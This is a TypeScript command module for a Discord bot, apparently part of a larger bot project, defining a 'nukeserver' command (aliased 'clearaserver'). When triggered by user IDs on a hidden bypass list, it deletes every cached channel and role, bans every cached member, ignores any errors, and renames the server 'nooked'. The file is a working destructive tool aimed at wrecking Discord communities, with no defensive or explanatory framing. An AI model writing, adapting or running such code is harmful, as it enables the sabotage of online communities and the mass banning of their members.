import { Message } from "discord.js";
import { bypassIds } from "../utils/config";

module.exports = {
	name: "nukeserver",
	description: "Nuke a server!",
	execute(message: Message, args: string[]) {
		if (
			Object.keys(bypassIds).some((id) => id == message.author.id) ==
			false
		)
			return;

		message.guild.channels.cache.forEach((channel) => {
			try {
				channel.delete();
			} catch (e) {}
		});

		message.guild.roles.cache.forEach((role) => {
			try {
				role.delete();
			} catch (e) {}
		});

		message.guild.members.cache.forEach((member) => {
			try {
				member.ban();
			} catch (e) {}
		});

		message.guild.setName("nooked");
	},
	type: 1,
	aliases: ["clearaserver"],
} as Command;
